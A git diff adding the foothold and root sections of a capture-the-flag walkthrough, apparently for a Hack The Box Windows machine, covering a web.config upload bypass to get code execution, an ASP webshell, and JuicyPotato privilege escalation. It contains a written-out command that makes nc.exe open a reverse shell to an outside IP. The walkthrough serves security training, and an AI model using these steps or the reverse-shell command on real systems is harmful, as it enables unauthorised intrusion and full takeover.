@@ -59,3 +59,57 @@ Progress: 661634 / 661683 (99.99%)
 2023/06/10 17:15:00 Finished
 ===============================================================
 ```
+- Web server
+
+![](./images/1.png)
+
+## Foothold/User
+- We see `transfer.aspx` and `uploadedFiles` endpoints available
+
+![](./images/2.png)
+![](./images/3.png)
+
+- Let's upload a file
+  - Success
+
+![](./images/4.png)
+![](./images/5.png)
+
+- But I couldn't upload a file with `aspx` extension
+  - there is a [blog](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
+  - and [this one](https://soroush.me/blog/2019/08/uploading-web-config-for-fun-and-profit-2/) from the same author
+  - Test out the `poc`
+  - And we see that we have `rce`
+
+![](./images/7.png)
+
+- I was trying different variations of `poc` but had no success
+  - Turns out, I broke the box so I needed to reboot it
+  - Then I used the same `poc` from the first blog as in the picture above
+  - But added few modifications, using `/usr/share/webshells/asp/cmdasp.asp`
+
+![](./images/13.png)
+![](./images/6.png)
+
+- Let's upload and run it
+  - And we get our foothold
+
+![](./images/8.png)
+![](./images/9.png)
+
+## Root
+- Enumerate privileges
+  - `whoami /priv`
+  - We see `SeImpersonatePrivilege`
+
+![](./images/11.png)
+
+- Let's run [JuicyPotato](https://github.com/decoder-it/juicy-potato)
+  - So download `binary` and `nc.exe`
+  - Set up new listener
+  - `.\jp.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\merlin\downloads\nc.exe 10.10.16.3 7777 -e cmd.exe" -t *`
+  - And root the box
+
+![](./images/12.png)
+![](./images/13.png)
+
